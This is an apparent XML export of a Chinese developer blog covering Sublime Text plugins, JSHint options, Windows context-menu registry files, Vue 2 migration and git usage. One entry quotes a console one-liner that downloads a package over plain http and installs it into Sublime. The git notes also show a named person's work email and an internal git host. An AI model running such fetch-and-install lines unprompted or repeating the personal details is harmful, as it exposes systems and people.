new function () { … }和new Object;。这种结构有时用于在JavaScript中产生单例：var singleton = new function() { var privateVar; this.publicMethod = function () {} this.publicMethod2 = function () {}}; validthis 当代码以严格模式运行并this在非构造函数中使用时，此选项将禁止有关可能的严重违规的警告。你应该使用这个选项 - 在一个函数范围内 - 当你肯定你的使用this在严格模式是有效的（例如，如果你调用你的函数使用 Function.call）。注意：此选项只能在函数作用域内使用。如果您尝试全局设置此选项，JSHint将失败并显示错误。 withstmt 此选项禁止有关使用语句的警告with。语句的with语义可能导致开发人员之间的混乱和全局变量的意外定义。更多信息：与声明考虑有害 环境 这些选项让JSHint知道一些预定义的全局变量。 browser 此选项定义了现代浏览器暴露全局：从好老一路document和navigator对HTML5 FileReader在浏览器世界等新的发展。注意：此选项不会公开像alert或的 变量console。有关详细信息，请参阅选项devel。 browserify 此选项定义使用Browserify工具构建项目时可用的全局变量。 couch 此选项定义由CouchDB公开的全局变量 。CouchDB是一个面向文档的数据库，可以使用JavaScript以MapReduce方式查询和索引。 devel 此选项定义通常用于记录恶意调试的全局变量：console，alert等等。通常不建议在生产环境中运行它们，因为例如console.log在Internet Explorer的旧版本中断。 dojo 此选项定义由Dojo Toolkit公开的全局变量。 jasmine 此选项定义由Jasmine单元测试框架公开的全局变量。 j query （出现未知情况，加空格解决） 此选项定义由jQuery JavaScript库公开的全局变量。 mocha 此选项定义由摩卡单元测试框架的“BDD”和“TDD”UI公开的全局变量 。 module 此选项通知JSHint输入代码描述了ECMAScript 6模块。所有模块代码都被解释为严格模式代码。 mootools 此选项定义由MooTools JavaScript框架公开的全局变量 。 node 此选项定义当代码在Node运行时环境中运行时可用的全局变量。Node.js是一个使用异步事件驱动模型的服务器端JavaScript环境。此选项还会跳过在浏览器环境中有意义的一些警告，但在节点（如文件级use strict编译指示和console.log语句）中没有意义。 nonstandard 此选项定义非标准但广泛采用的全局变量，如 escape和unescape。 phantom 此选项定义当您的核心在PhantomJS运行时环境中运行时可用的全局变量。PhantomJS 是一个使用JavaScript API的无头WebKit脚本。它支持各种Web标准的快速和本地支持：DOM处理，CSS选择器，JSON，Canvas和SVG。 prototypejs 此选项定义由Prototype JavaScript框架公开的全局变量 。 qunit 此选项定义由QUnit单元测试框架公开的全局变量。 rhino 此选项定义当代码在Rhino运行时环境中运行时可用的全局变量。Rhino 是一个完全用Java编写的JavaScript的开源实现。 shelljs 此选项定义由ShellJS库公开的全局变量。 typed 此选项为类型化数组构造函数定义全局变量。更多信息：JavaScript类型数组 worker 此选项定义当代码在Web Worker中运行时可用的全局变量。Web Workers为Web内容在后台线程中运行脚本提供了一种简单的方法。 wsh 此选项定义当代码作为Windows脚本宿主的脚本运行时可用的全局变量。 yui 此选项定义由YUI JavaScript框架公开的全局变量。]]></content>
      <categories>
        <category>IDE</category>
      </categories>
      <tags>
        <tag>IDE</tag>
        <tag>Sublime</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IDE-Sublime lint 语法校验]]></title>
    <url>%2Fblob%2F2017-03-13-ide-sublime-lint-syntax-check%2F</url>
    <content type="text"><![CDATA[package control install package SublimeLinter https://packagecontrol.io/packages/SublimeLinter SublimeLinter-jshint https://packagecontrol.io/packages/SublimeLinter-jshint SublimeLinter-csslint https://packagecontrol.io/packages/SublimeLinter-csslint node install npm i -g jshint npm i -g csslint 配置 可校验js代码编写过程中不规范的地方，因为有缓存不会实时显示在项目根目录下创建.jshintrc文件，文件以json格式保存，可以有哪些设置，在下面这个网站 http://jshint.com/docs/options/ http://sublimelinter.readthedocs.org/en/latest/about.html 例如： { &quot;eqeqeq&quot;: true, // true: Require triple equals (===) for comparison } 使用同一个配置，配置如下。该方法优先于项目下的配置文件 文件：SublimeLinter.sublime-settings 123456789101112131415161718 &#123; &quot;user&quot;: &#123; &quot;debug&quot;: false, &quot;delay&quot;: 0.25, &quot;error_color&quot;: &quot;D02000&quot;, &quot;gutter_theme&quot;: &quot;Packages/SublimeLinter/gutter-themes/Default/Default.gutter-theme&quot;, &quot;gutter_theme_excludes&quot;: [], &quot;lint_mode&quot;: &quot;background&quot;, &quot;linters&quot;: &#123; &quot;jshint&quot;: &#123; &quot;@disable&quot;: false, &quot;args&quot;: [ &quot;--config&quot;, &quot;D:\\config\\.jshintrc&quot; ], &quot;excludes&quot;: [] &#125;, 他人详细教程 https://gaohaoyang.github.io/2015/03/26/sublimeLinter]]></content>
      <categories>
        <category>IDE</category>
      </categories>
      <tags>
        <tag>IDE</tag>
        <tag>Sublime</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IDE-Sublime 添加鼠标右键打开]]></title>
    <url>%2Fblob%2F2017-03-03-ide-sublime-add-mouse-right-click-open%2F</url>
    <content type="text"><![CDATA[原文：（http://www.cnblogs.com/1314-/p/6479590.html） 方法一（推荐） 把以下代码，复制到SublimeText3的安装目录，然后重命名为：sublime_addright.inf，然后右击安装就可以了。PS：重命名文件之前，需要先在工具–文件夹选项，查看中，把隐藏已知文件类型的扩展名前边的复选框不勾选。 12345678910 [Version]Signature=&quot;$Windows NT$&quot;[DefaultInstall]AddReg=SublimeText3[SublimeText3]hkcr,&quot;\shell\SublimeText3&quot;,,,&quot;用 SublimeText3 打开&quot;hkcr,&quot;\shell\SublimeText3\command&quot;,,,&quot;&quot;&quot;%1%\sublime_text.exe&quot;&quot; &quot;&quot;%%1&quot;&quot; %%&quot;hkcr,&quot;Directory\shell\SublimeText3&quot;,,,&quot;用 SublimeText3 打开&quot;hkcr,&quot;\shell\SublimeText3&quot;,&quot;Icon&quot;,0x20000,&quot;%1%\sublime_text.exe, 0&quot;hkcr,&quot;Directory\shell\SublimeText3\command&quot;,,,&quot;&quot;&quot;%1%\sublime_text.exe&quot;&quot; &quot;&quot;%%1&quot;&quot;&quot; 方法二 把以下代码，复制到SublimeText3的安装目录，然后重命名为：sublime_addright.reg，然后双击就可以了。PS:需要把里边的Sublime的安装目录，替换成实际的Sublime安装目录。 1234567891011 Windows Registry Editor Version 5.00[HKEY_CLASSES_ROOT*\shell\SublimeText3]@=&quot;用 SublimeText3 打开&quot;&quot;Icon&quot;=&quot;D:\Program Files\Sublime Text 3\sublime_text.exe,0&quot;[HKEY_CLASSES_ROOT*\shell\SublimeText3\command]@=&quot;D:\Program Files\Sublime Text 3\sublime_text.exe %1&quot;[HKEY_CLASSES_ROOT\Directory\shell\SublimeText3]@=&quot;用 SublimeText3 打开&quot;&quot;Icon&quot;=&quot;D:\Program Files\Sublime Text 3\sublime_text.exe,0&quot;[HKEY_CLASSES_ROOT\Directory\shell\SublimeText3\command]@=&quot;D:\Program Files\Sublime Text 3\sublime_text.exe %1&quot; 如果以上方法不可行，则手动设置（测试通过，win10）项目路径： 12345 [HKEY_CLASSES_ROOT*\shell\SublimeText3] 默认字符串值：用 SublimeText3 打开 Icon字符串值：D:\Program Files\Sublime Text 3\sublime_text.exe,0 [HKEY_CLASSES_ROOT*\shell\SublimeText3\command] 默认字符串值：D:\Program Files\Sublime Text 3\sublime_text.exe %1 如图一 项目路径： 12345 [HKEY_CLASSES_ROOT\Directory\shell\SublimeText3] 默认字符串值：用 SublimeText3 打开 Icon字符串值：D:\Program Files\Sublime Text 3\sublime_text.exe,0[HKEY_CLASSES_ROOT\Directory\shell\SublimeText3\command] 默认字符串值：D:\Program Files\Sublime Text 3\sublime_text.exe %1 如图2]]></content>
      <categories>
        <category>IDE</category>
      </categories>
      <tags>
        <tag>IDE</tag>
        <tag>Sublime</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue 1 to Vue2 那些事]]></title>
    <url>%2Fblob%2F2017-01-16-vue-1-to-vue-2%2F</url>
    <content type="text"><![CDATA[ue api 2 vue-router api 2 从 Vue 1.x 迁移 从 Vue Router 0.7.x 迁移 Vue 2.0 Changes 使用vue提供的 迁移工具 vue-migration-helper 可以检测出问题， 123456789101112 # installnpm install --global vue-migration-helper # navigate to a Vue 1.x project directorycd path/to/my-vue-project # scan all files in the current directoryvue-migration-helper# scan all files in specific sub-directoriesvue-migration-helper src folder-a folder-b# scan a specific file or filesvue-migration-helper src/app.vue 下面说一些主要的问题 app.js 创建vue实例使用new的方式 定义的router在创建实例时加入 ready方法的替换 代码如下： 123456789101112 const app = new Vue(&#123; data() &#123; return &#123; isHome: false &#125;; &#125;, router: router, mounted() &#123; this.$nextTick(function() &#123; &#125;) &#125;&#125;).$mount('#app') \/*.vue for循环没有$index 当循环router-link时要在外层循环template，否则会阻碍属性:to的使用 代码如下 123 &lt;div class="list" v-for="(mlist, index) in media_lists" :class="&#123;'active':index==0&#125;"&gt; &lt;!-- --&gt;&lt;/div&gt; 组件template下只能有一个节点 继承的变量不能在data里面重复写 事件传递问题 经过多少次的实验，最后的解决方案是vuex来进行状态管理 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263 // store.jsexport default new Vuex.Store(&#123; state: &#123; loading: false &#125;, mutations: &#123; load_show(state) &#123; state.loading = true; &#125;, load_hide(state) &#123; state.loading = false; &#125; &#125;&#125;) // app.jsimport store from './store'; // ...const app = new Vue(&#123; data() &#123; return &#123; isHome: false &#125;; &#125;, store, router: router, mounted() &#123; this.$nextTick(function() &#123; &#125;) &#125;&#125;).$mount('#app') // ryLoading.vue&lt;template&gt; &lt;div class="w-loading" v-if="loading"&gt; &lt;div class="icon"&gt;&lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;script lang="babel"&gt;export default&#123; data() &#123; return &#123; &#125; &#125;, computed: &#123; loading () &#123; return this.$store.state.loading &#125; &#125;, watch: &#123; &#125;, mounted() &#123; this.$nextTick(function() &#123; &#125;) &#125;&#125;&lt;/script&gt; //list.vuethis.$store.commit("load_show");this.$store.commit("load_hide"); select for循环问题，代码如下 12345 &lt;select v-model="content" class="select"&gt; &lt;template v-for="(item, index) in contentSel"&gt; &lt;option v-bind:value="item"&gt;&#123;&#123;item&#125;&#125;&lt;/option&gt; &lt;/template&gt;&lt;/select&gt; 接下来是最重要的vue-router2，感觉灰常难搞 router.js new VueRouter创建参数的变化 子路由使用children，且是一个数组，原来是一个对象 router-view 状态切换使用transition标签，切换自定义样式添加-active 路由重定向方式的变化 见vue-router api 2 首页path为空时，导航栏显示激活状态异常，非home时覆盖激活的样式。 代码如下 app.js中内容 12345 import routerMap from './router'var router = new VueRouter(&#123; mode: 'history', routes: routerMap()&#125;); router.afterEach 参数变化（参数title在meta中） 123456789101112131415 router.afterEach((to, from) =&gt; &#123; router.app.isHome = to.name.indexOf('home') == 0 ? true : false; var fromHome = (from &amp;&amp; from.name &amp;&amp; from.name.indexOf('home') == 0) ? true : false; if (to.meta.title) &#123; document.title = to.meta.title; &#125; if(!router.app.isHome)&#123; window.scrollTo(0, 0); &#125;else if(router.app.isHome &amp;&amp; fromHome)&#123; var el = to.query &amp;&amp; to.query.el; var posY = el ? $(el).offset().top : 0; window.scrollTo(0, posY); &#125;&#125;); router.js（自定义参数title放在meta中、path除了根节点，其他都不加 “/”） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758 export default function()&#123; var routerMap = [&#123; path: prefix(), component: require('business/business'), name: MODULE_NAME, children: [ &#123; path: '', name: 'home', alias: '/', meta: &#123;title: '首页'&#125;, component: function(resolve)&#123; require.ensure(['business/home/home'], function()&#123; require(['business/home/home'], resolve); &#125;, 'home') &#125; &#125;, &#123; path: 'products', name: 'products', component: Vue.extend(&#123; template: '&lt;div class="p-products"&gt;&lt;transition name="fade" mode="out-in"&gt;&lt;router-view&gt;&lt;/router-view&gt;&lt;/transition&gt;&lt;/div&gt;' &#125;), children: [ &#123; path: 'pos', meta: &#123;title:'容易POS'&#125;, name: 'products.pos', component: function(resolve)&#123; require.ensure(['business/products/pos/pos'], function()&#123; require(['business/products/pos/pos'], resolve); &#125;, 'products.pos') &#125; &#125; ] &#125; ] &#125;]; function prefix(path='')&#123; if(path == '*')&#123; return path; &#125; if(ENV == 'online' || ENV == 'pre_online')&#123; if(path)&#123; return path; &#125;else&#123; return '/'; &#125; &#125;else&#123; return '/' + MODULE_NAME + path; &#125; &#125; return routerMap;&#125; css 123 .fade-leave-active &#123; opacity: 0;&#125; v-link =&gt; router-link 标签 样式变化router-link-active、标签变化 需要注意to=””和:to=”{}”的区别 router-link api]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue2</tag>
        <tag>Vue1</tag>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GIT-Flow]]></title>
    <url>%2Fblob%2F2016-08-17-git-flow%2F</url>
    <content type="text"><![CDATA[git-flow 备忘清单 git-flow 备忘清单源码 历史分支 功能分支 发布分支 维护分支 获取分支方式 合并分支方式 Master 主分支 被release、hotfix分支合并 Hotfix 线上修复分支 从master拉取分支 合并到master、develop分支 Release 上线分支 从develop拉取分支 合并到master、develop分支 Develop 开发分支 初始从master拉取分支 合并到master分支 Feature 功能分支 从develop拉取分支、合并分支 合并到develop分支]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Git Flow</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IDE-Sublime Package Ctrl安装与卸载]]></title>
    <url>%2Fblob%2F2016-07-21-installation-and-unloading-of-ide-sublime-package-ctrl%2F</url>
    <content type="text"><![CDATA[http://www.sublimetext.com/3 卸载 打开sublime，选择Preferences &gt; Browse Packages 返回到文件夹上一级，进入Installed Packages 删除 Package Control.sublime-package 重新安装package control https://packagecontrol.io/installation 安装 The simplest method of installation is through the Sublime Text console. The console is accessed via the ctrl+` shortcut or the View &gt; Show Console menu. Once open, paste the appropriate Python code for your version of Sublime Text into the console. SUBLIME TEXT 3 1 import urllib.request,os,hashlib; h = &apos;2915d1851351e5ee549c20394736b442&apos; + &apos;8bc59f460fa1548d1514676163dafc88&apos;; pf = &apos;Package Control.sublime-package&apos;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); by = urllib.request.urlopen( &apos;http://packagecontrol.io/&apos; + pf.replace(&apos; &apos;, &apos;%20&apos;)).read(); dh = hashlib.sha256(by).hexdigest(); print(&apos;Error validating download (got %s instead of %s), please try manual install&apos; % (dh, h)) if dh != h else open(os.path.join( ipp, pf), &apos;wb&apos; ).write(by)]]></content>
      <categories>
        <category>IDE</category>
      </categories>
      <tags>
        <tag>IDE</tag>
        <tag>Sublime</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GIT-合并最后的2个提交]]></title>
    <url>%2Fblob%2F2016-05-19-git---merge-the-last-two-submissions%2F</url>
    <content type="text"><![CDATA[假设要合并最后的2个提交，可以按如下命令进行： git rebase –i HEAD~2运行完该命令，会出现如下所示内容： 将第二个pick修改为squash或者s，然后输入”:wq”退出。 这时git会自动第二个提交合并到第一个中去。并提示输入新的message（就是我们常说的comments），如下： 编辑输入新的message，然后输入”:wq”退出 此时本地的（HEAD中）最后两次提交已经被合并为一个。git log可以查看。 如果需要提交到远端，运行git push –force origin master即可。]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>rebase</tag>
        <tag>合并提交</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IDE-Sublime 配置Node.js开发环境]]></title>
    <url>%2Fblob%2F2016-04-01-ide-sublime-configuration-node.js-development-environment%2F</url>
    <content type="text"><![CDATA[1、下载Nodejs插件，下载地址为：https://github.com/tanepiper/SublimeText-Nodejs下载zip压缩包后解压，文件名改为Nodejs 2、打开Sublime Text3，点击菜单“Perferences” =&gt;“Browse Packages”打开“Packages”文件夹，并将第1部的Nodejs文件夹剪切进来 3、打开文件“Nodejs.sublime-build”，将代码 “encoding”: “cp1252” 改为 “encoding”: “utf8” ，将代码 “cmd”: [“taskkill /F /IM node.exe &amp; node”, “$file”] 改为 “cmd”: [“node”, “$file”] ，保存文件 4、打开文件“Nodejs.sublime-settings”，将代码 “node_command”: false改为 “node_command”: “D:\Program Files\nodejs\node.exe” ，将代码 “npm_command”: false 改为 “npm_command”: “D:\Program Files\nodejs\npm.cmd” ，保存文件 5、编写一个测试文件test.js，按“ctrl+B”运行代码，运行结果如下图所示： 至此，环境配置成功！（注：本人的系统为Win10，Nodejs安装路径为E:\Program Files\nodejs）]]></content>
      <categories>
        <category>IDE</category>
      </categories>
      <tags>
        <tag>IDE</tag>
        <tag>Sublime</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IDE-Sublime Package Control]]></title>
    <url>%2Fblob%2F2016-03-17-ide-sublime-package-control%2F</url>
    <content type="text"><![CDATA[查看可使用的插件：https://packagecontrol.io/Ctrl + Shift + P、pcip、 代码快速生成器 emmet、emmet css snippets - - - 快速生成简单页面 !，Ctrl + E 该方法是emmet快捷键，分两步完成 ul&gt;.item$*10 &gt;：子元素选择符.item：子元素是item开头$：代表序号*10：输入10个带有class=”item123….10” 扩展，很酷 div#s.d&gt;div#e.s&gt;span.em5&gt;span.im$5 http://emmet.io/https://github.com/sergeche/emmet-sublimehttps://github.com/sergeche/emmet-sublime#tab-key-handler javascript 快速提示 javascript snippet/Completions jquery快速提示 jquery 快速生成回掉函数 `insert callback` https://packagecontrol.io/packages/Insert%20Callback Press Alt+C. If the function call’s trailing semicolon is missing, it will be filled in. A callback function snippet will then be inserted. 123 someAsyncFn(function(err, d) &#123;&#125;); 快速创建文件 advancedNewFile https://packagecontrol.io/packages/AdvancedNewFilehttps://github.com/skuroda/Sublime-AdvancedNewFilectrl+alt+n: General keymap to create new files.ctrl+shift+alt+n: In addition to creating the folders specified, new folders will also contain an init.py file. 测试请求 Http Requester https://packagecontrol.io/packages/Http%20RequesterAlt + Ctrl + R 快速访问选中文字的链接get 请求和 post请求方式不同POST http://posttestserver.com/post.phpContent-type: application/x-www-form-urlencodedPOST_BODY:variable1=avalue&amp;variable2=1234&amp;variable3=anothervalueGET http://www.google.com/search?q=test 每次编码需要公共组件，因此可以从一个公共配置中下载 Nettuts+ Fetch https://packagecontrol.io/packages/Nettuts%2B%20FetchCtrl + Shift + Pfetch: file 下载选择文件内容fetch: manage 管理配置文件类库fetch: package 添加sidebar右键功能 Side​Bar​Enhancements https://packagecontrol.io/packages/SideBarEnhancements 生成文件头部注释 FileHeaderhttps://packagecontrol.io/packages/FileHeader 添加注释代码 Doc​Blockr https://packagecontrol.io/packages/DocBlockr 语法校验 Sublime​Linter https://packagecontrol.io/packages/SublimeLinter SublimeLinter-jshint https://packagecontrol.io/packages/SublimeLinter-jshint npm i -g jshint SublimeLinter-csslint https://packagecontrol.io/packages/SublimeLinter-csslint npm i -g csslint 可校验js代码编写过程中不规范的地方，因为有缓存不会实时显示在项目根目录下创建.jshintrc文件，文件以json格式保存，可以有哪些设置，在下面这个网站http://jshint.com/docs/options/http://sublimelinter.readthedocs.org/en/latest/about.html例如： { “eqeqeq”: true, // true: Require triple equals (===) for comparison }使用同一个配置，配置如下文件：SublimeLinter.sublime-settings 123456789101112131415161718 &#123; &quot;user&quot;: &#123; &quot;debug&quot;: false, &quot;delay&quot;: 0.25, &quot;error_color&quot;: &quot;D02000&quot;, &quot;gutter_theme&quot;: &quot;Packages/SublimeLinter/gutter-themes/Default/Default.gutter-theme&quot;, &quot;gutter_theme_excludes&quot;: [], &quot;lint_mode&quot;: &quot;background&quot;, &quot;linters&quot;: &#123; &quot;jshint&quot;: &#123; &quot;@disable&quot;: false, &quot;args&quot;: [ &quot;--config&quot;, &quot;D:\\.jshintrc&quot; ], &quot;excludes&quot;: [] &#125;, 切换语言 ChineseLocalization 切换语言，帮助(H)/Language/简体中文，繁体中文，日本语，English。 HTML+CSS+JAVASCRIPT+JSON快速格式化 HTML-CSS-JS Prettify https://packagecontrol.io/packages/HTML-CSS-JS%20Prettify Tools -&gt; Command Palette (Cmd+Shift+P or Ctrl+Shift+P) and type htmlprettify.– or –Ctrl+Shift+H (or Cmd+Shift+H if you’re on a Mac).– or –Right click in the current buffer and select HTML/CSS/JS Prettify -&gt; Prettify Code.安装完运行需要从新设置node路径 CSS2REM 安装 下载本项目，比如：git clone https://github.com/flashlizi/cssrem 进入packages目录：Sublime Text -&gt; Preferences -&gt; Browse Packages… 复制下载的cssrem目录到刚才的packges目录里。 重启Sublime Text。 配置参数 参数配置文件：Sublime Text -&gt; Preferences -&gt; Package Settings -&gt; cssrem px_to_rem - px转rem的单位比例，默认为40。 max_rem_fraction_length - px转rem的小数部分的最大长度。默认为6。 available_file_types - 启用此插件的文件类型。默认为：[“.css”, “.less”, “.sass”] 打开CMD Terminal 打开文件的终端，终端默认是CMD。ctrl+shift+t 打开文件所在文件夹，ctrl+shift+alt+t 打开文件所在项目的根目录文件夹，可以自己重新配置快捷键。也可以右键open terminal here打开。 Less Less语法高亮： pci &gt; less &gt; 重启 &gt; less语法高亮 Less2Csshttps://packagecontrol.io/packages/Less2Cssnpm install less -gdnpm install -g less-plugin-clean-cssnpm install -g less-plugin-autoprefix emmet 插件 emmet 插件 安装Ctrl + Shift + P、pcip、emmetCtrl + Shift + P、pcip、emmet css snippets - - - 快速生成简单页面 !，Ctrl + E 该方法是emmet快捷键，分两步完成 ul&gt;.item$*10 &gt; ：子元素选择符.item：子元素是item开头$：代表序号*10：输入10个带有class=”item123….10” 扩展，很酷 div#s.d&gt;div#e.s&gt;span.em5&gt;span.im$5 http://emmet.io/https://github.com/sergeche/emmet-sublimehttps://github.com/sergeche/emmet-sublime#tab-key-handler]]></content>
      <categories>
        <category>IDE</category>
      </categories>
      <tags>
        <tag>IDE</tag>
        <tag>Sublime</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IDE-Sublime 快捷键]]></title>
    <url>%2Fblob%2F2016-03-16-ide-sublime-shortcut-key%2F</url>
    <content type="text"><![CDATA[官网：http://www.sublimetext.com/ - - - 快速创建文本编辑区 Ctrl + N - - - 查找文件 Ctrl + P 输入文件名、文件路径、支持模糊匹配 跳转到行 Ctrl + P，： 输入: + 文件中行号 查找方法 JS、CSS Ctrl + P，@xx 输入@ + 方法名/CSS选择器 方向键上下选择 综合查找 Ctrl + P，xx@xx 输入文件名/路径 + @ + 方法名/CSS选择器 方向键上下选择 查找HTML标签 Ctrl + P，#xx - - - 多行光标 Ctrl + D 选择文字，之后没按一次 Ctrl + D可选择一个相同的内容并在其后面出现一个光标，可完成共同编辑。 Ctrl + K/Ctrl + D 取消多行游标的选择，继续Ctrl + D可继续选择 Alt + F3 选中全部 Ctrl + Shift + L 在选中区域最右边添加光标当选中区域是多行时，在每行结尾设置光标 Shift + 鼠标右键拖动 在鼠标右键拖动的时候设置光标 - - - 命令模式 Ctrl + Shift + P 启动命令面板（以下只输入命名）支持模糊匹配 选择语法格式 set syntax CSS、Javascript等， 主题安装https://packagecontrol.io/labels &gt; theme &gt; 找需要查看的主题 Spacegray snippets以模板的方式编程Ctrl + Shift + P &gt; snippet:function 设置大小写转换按键Preferences &gt; Key Bindings { “keys”: [“ctrl+shift+x”], “command”: “upper_case” }, { “keys”: [“ctrl+shift+c”], “command”: “lower_case” }, 设置tab空格数量// The number of spaces a tab is considered equal to“tab_size”: 2,// Set to true to insert spaces when tab is pressed“translate_tabs_to_spaces”: true,]]></content>
      <categories>
        <category>IDE</category>
      </categories>
      <tags>
        <tag>IDE</tag>
        <tag>Sublime</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GIT 异常]]></title>
    <url>%2Fblob%2F2016-01-20-git-anomaly%2F</url>
    <content type="text"><![CDATA[Couldn’t reserve space for cygwin’s heap, Win32 error 0 问题表现： 0 [main] us 0 init_cheap: VirtualAlloc pointer is null, Win32 error 487 AllocationBase 0x0, BaseAddress 0x68560000, RegionSize 0x390000, State 0x10000 C:\Program Files\Git\bin\sh.exe: *** Couldn’t reserve space for cygwin’s heap, Win32 error 0 解决办法： http://stackoverflow.com/questions/18502999/git-extensions-win32-error-487-couldnt-reserve-space-for-cygwins-heap-win32 在安装目录下X:\xxx\xxx\bin执行如下命令 rebase.exe -b 0x50000000 msys-1.0.dll]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GIT 常用记录]]></title>
    <url>%2Fblob%2F2015-09-17-common-records-of-git%2F</url>
    <content type="text"><![CDATA[命令 说明 git status 查看当前状态 git log 查看当前分支日志 git branch -a 查看所有分支情况(包括远程分支) git branch 查看所有分支情况 git branch XXXXX 创建分支XXXXX git checkout XXXXX 选择分支XXXXX git checkout -b XXXXX 创建并选择分支XXXXX git push origin myBranch:serverBranch 推送myBranch到serverBranch git push origin :serverBranch 删除服务器分支 git push origin –delete serverfix 删除服务器分支 git push –force 覆盖了服务器上的提交历史(慎用) .gitignore 忽略提交文件的记录文件 git commit -a -m “注释写到这里” -a：为缓存也可提交 -m：添加注释 git tag 标签 git tag -a v0.1 -m “” 含附注标签 git tag v0.2 轻量级标签 git push origin v0.1 推送标签 git rebase -i HEAD~3 合并当前分支前三个提交（未push）(慎用) git rebase -i origin/serverBranch 将未提交至远程服务器的提交合并 git rebase –abort 撤销合并 git rebase –continue 添加完继续执行 git rebase –skip 跳过 git checkout master git merge client 合并client到master git checkout master git rebase client 变基client到master git rebase client master 变基client到master git pull –rebase orgin serverBranch 处理冲突 git add * git rebase –continue 变基远程分支 git fetch git rebase orgin/serverBranch 处理冲突 git add * git rebase –continue 变基远程分支 git fetch origin myBranch:serverBranch 拉取远程分支（本地不存在） git fetch 更新你的远程仓库引用 git checkout -b myBranch origin/serverBranch 拉取远程分支（本地不存在） git 在变基client到master时，如果是已经提交到远程代码仓库的代码建议不要变基，使用合并。 第一次建立github项目，初始导入 123456 echo # test &gt;&gt; README.md LICENSE.mdgit initgit add README.mdgit commit -m &quot;first commit&quot;git remote add origin https://github.com/holidaypenguin/test.gitgit push -u origin master Git global setup 12 git config --global user.name "宋施澎"git config --global user.email "songshipeng@rongyi.com" Create a new repository 12345678 mkdir pos_democd pos_demogit inittouch README.mdgit add README.mdgit commit -m "first commit"git remote add origin git@git.internal.rongyi.com:songshipeng/pos_demo.gitgit push -u origin master Push an existing Git repository 123 cd existing_git_repogit remote add origin git@git.internal.rongyi.com:songshipeng/pos_demo.gitgit push -u origin master]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GIT 提交忽略文件]]></title>
    <url>%2Fblob%2F2015-09-17-git-submits-ignored-files%2F</url>
    <content type="text"><![CDATA[一般我们总会有些文件无需纳入 Git 的管理，也不希望它们总出现在未跟踪文件列表。通常都是些自动生成的文件，比如日志文件，或者编译过程中创建的临时文件等。我们可以创建一个名为 .gitignore 的文件，列出要忽略的文件模式。来看一个实际的例子： 123 $ cat .gitignore*.[oa]*~ 第一行告诉 Git 忽略所有以 .o 或 .a 结尾的文件。一般这类对象文件和存档文件都是编译过程中出现的，我们用不着跟踪它们的版本。第二行告诉 Git 忽略所有以波浪符（~）结尾的文件，许多文本编辑软件（比如 Emacs）都用这样的文件名保存副本。此外，你可能还需要忽略 log，tmp 或者 pid 目录，以及自动生成的文档等等。要养成一开始就设置好 .gitignore 文件的习惯，以免将来误提交这类无用的文件。 文件 .gitignore 的格式规范如下： 所有空行或者以注释符号 ＃ 开头的行都会被 Git 忽略。 可以使用标准的 glob 模式匹配。 匹配模式最后跟反斜杠（/）说明要忽略的是目录。 要忽略指定模式以外的文件或目录，可以在模式前加上惊叹号（!）取反。 所谓的 glob 模式是指 shell 所使用的简化了的正则表达式。星号（*）匹配零个或多个任意字符；[abc] 匹配任何一个列在方括号中的字符（这个例子要么匹配一个 a，要么匹配一个 b，要么匹配一个 c）；问号（?）只匹配一个任意字符；如果在方括号中使用短划线分隔两个字符，表示所有在这两个字符范围内的都可以匹配（比如 [0-9] 表示匹配所有 0 到 9 的数字）。我们再看一个 .gitignore 文件的例子： 123456 # 此为注释 – 将被 Git 忽略*.a # 忽略所有 .a 结尾的文件!lib.a # 但 lib.a 除外/TODO # 仅仅忽略项目根目录下的 TODO 文件，不包括 subdir/TODObuild/ # 忽略 build/ 目录下的所有文件doc/*.txt # 会忽略 doc/notes.txt 但不包括 doc/server/arch.txt 在git中如果想忽略掉某个文件，不让这个文件提交到版本库中，可以使用修改 .gitignore 文件的方法。这个文件每一行保存了一个匹配的规则例如： 123456 # 此为注释 – 将被 Git 忽略*.a # 忽略所有 .a 结尾的文件!lib.a # 但 lib.a 除外/TODO # 仅仅忽略项目根目录下的 TODO 文件，不包括 subdir/TODObuild/ # 忽略 build/ 目录下的所有文件doc/*.txt # 会忽略 doc/notes.txt 但不包括 doc/server/arch.txt 这样设置了以后 所有的 .pyc 文件都不会添加到版本库中去。另外 git 提供了一个全局的 .gitignore，你可以在你的用户目录下创建 ~/.gitignoreglobal 文件，以同样的规则来划定哪些文件是不需要版本控制的。需要执行 git config --global core.excludesfile ~/.gitignoreglobal来使得它生效。 其他的一些过滤条件 123456 * ？：代表任意的一个字符* ＊：代表任意数目的字符* &#123;!ab&#125;：必须不是此类型* &#123;ab,bb,cx&#125;：代表ab,bb,cx中任一类型即可* [abc]：代表a,b,c中任一字符即可* [ ^abc]：代表必须不是a,b,c中任一字符 由于git不会加入空目录，所以下面做法会导致tmp不会存在 1 tmp/* //忽略tmp文件夹所有文件 改下方法，在tmp下也加一个.gitignore,内容为 12 *!.gitignore 还有一种情况，就是已经commit了，再加入gitignore是无效的，所以需要删除下缓存 1 git rm -r --cached ignore_file 注意： 